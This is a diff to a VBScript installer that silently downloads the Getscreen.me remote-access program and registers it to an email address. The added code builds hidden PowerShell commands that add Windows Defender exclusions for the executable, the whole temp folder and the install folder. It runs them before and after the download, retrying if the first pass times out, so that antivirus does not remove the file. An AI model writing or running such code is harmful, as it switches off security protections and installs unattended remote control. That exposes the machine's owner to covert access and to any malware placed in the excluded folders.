@@ -9,9 +9,11 @@ Const ADD_AV_EXCLUSION = True   ' Add Windows Defender exclusion to reduce AV pu
 Const SILENT_MODE = True        ' True = no popups, False = debug popups
 Const ENABLE_LOG = True         ' Writes log to %TEMP%\getscreen_install.log
 Const AV_EXCLUSION_TIMEOUT_SEC = 30  ' Do not block forever if Defender/MpPreference hangs
+Const EXCLUDE_INSTALL_FOLDER = True ' Also exclude install dir (reduces blocks during/after install)
+Const INSTALL_FOLDER = "C:\Program Files\Getscreen.me"
 
-Dim wshShell, exePath, cmd, objHTTP, objStream, fso, isElevated, exitCode, logPath, logFile
-Dim tempPath, psExe
+Dim wshShell, exePath, cmd, objHTTP, objStream, fso, isElevated, exitCode, logPath
+Dim tempPath, psExe, avPass1TimedOut
 
 ' === Log helper ===
 Sub LogWrite(txt)
@@ -28,8 +30,9 @@ Function PsEscapeSingleQuoted(p)
     PsEscapeSingleQuoted = Replace(p, "'", "''")
 End Function
 
-' Run a command line without waiting forever (fixes hang on Add-MpPreference on some PCs)
-Sub RunWithTimeoutSec(cmdLine, timeoutSec, stepName)
+' Run a command line without waiting forever (fixes hang on Add-MpPreference on some PCs).
+' Returns True if timed out (caller may retry exclusions).
+Function RunWithTimeoutSec(cmdLine, timeoutSec, stepName)
     Dim oExec, startTime, timedOut
     timedOut = False
     LogWrite stepName & " (timeout " & timeoutSec & "s)..."
@@ -49,15 +52,24 @@ Sub RunWithTimeoutSec(cmdLine, timeoutSec, stepName)
     If Not timedOut Then
         LogWrite stepName & " finished, exit code=" & oExec.ExitCode
     End If
-End Sub
+    RunWithTimeoutSec = timedOut
+End Function
 
-Sub AddDefenderExclusions(pathExe, pathTemp)
-    Dim inner, psCmd
-    inner = "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathExe) & "' -ErrorAction SilentlyContinue; " & _
-            "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathTemp) & "' -ErrorAction SilentlyContinue"
-    psCmd = """" & psExe & """ -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & inner & """"
-    RunWithTimeoutSec psCmd, AV_EXCLUSION_TIMEOUT_SEC, "Adding AV exclusion"
-End Sub
+' Build one PowerShell -Command with multiple Add-MpPreference lines (paths must be non-empty to include).
+Function BuildExclusionCommand(pathExe, pathTemp, pathProg)
+    Dim parts
+    parts = ""
+    If Len(pathExe) > 0 Then
+        parts = parts & "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathExe) & "' -ErrorAction SilentlyContinue; "
+    End If
+    If Len(pathTemp) > 0 Then
+        parts = parts & "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathTemp) & "' -ErrorAction SilentlyContinue; "
+    End If
+    If Len(pathProg) > 0 Then
+        parts = parts & "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathProg) & "' -ErrorAction SilentlyContinue; "
+    End If
+    BuildExclusionCommand = """" & psExe & """ -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & parts & """"
+End Function
 
 ' === Admin elevation ===
 isElevated = False
@@ -78,14 +90,18 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 
 If ENABLE_LOG Then
     fso.CreateTextFile(logPath, True).Write ""
-    LogWrite "Log file: " & logPath
+    LogWrite "Logging enabled (ENABLE_LOG=True). Log file: " & logPath
 End If
 
 On Error Resume Next
 
-' === Add AV exclusion (reduces chance of AV purging the exe) ===
+' === Add AV exclusions before download (exe path may not exist yet; temp + install folder still help) ===
+avPass1TimedOut = False
 If ADD_AV_EXCLUSION Then
-    AddDefenderExclusions exePath, tempPath
+    Dim progPath
+    progPath = ""
+    If EXCLUDE_INSTALL_FOLDER Then progPath = INSTALL_FOLDER
+    avPass1TimedOut = RunWithTimeoutSec(BuildExclusionCommand(exePath, tempPath, progPath), AV_EXCLUSION_TIMEOUT_SEC, "AV exclusion pass 1 (pre-download: temp + target exe + install folder)")
 End If
 
 ' === Download EXE ===
@@ -123,6 +139,19 @@ If Not fso.FileExists(exePath) Then
 End If
 
 LogWrite "Download OK - File size: " & fso.GetFile(exePath).Size & " bytes"
+
+' === Second AV pass: file is on disk; retry temp if pass 1 timed out (restores point of exclusions) ===
+If ADD_AV_EXCLUSION Then
+    Dim progPath2, tempForPass2, pass2Label
+    progPath2 = ""
+    If EXCLUDE_INSTALL_FOLDER Then progPath2 = INSTALL_FOLDER
+    tempForPass2 = tempPath
+    If Not avPass1TimedOut Then tempForPass2 = ""
+    pass2Label = "AV exclusion pass 2 (post-download: exe on disk"
+    If Len(tempForPass2) > 0 Then pass2Label = pass2Label & " + temp retry"
+    pass2Label = pass2Label & " + install folder)"
+    RunWithTimeoutSec BuildExclusionCommand(exePath, tempForPass2, progPath2), AV_EXCLUSION_TIMEOUT_SEC, pass2Label
+End If
 
 ' === Run: getscreen.exe -install -register (official GetScreen cmd - no /s, built-in silent) ===
 cmd = """" & exePath & """ -install -register " & REGISTER_EMAIL
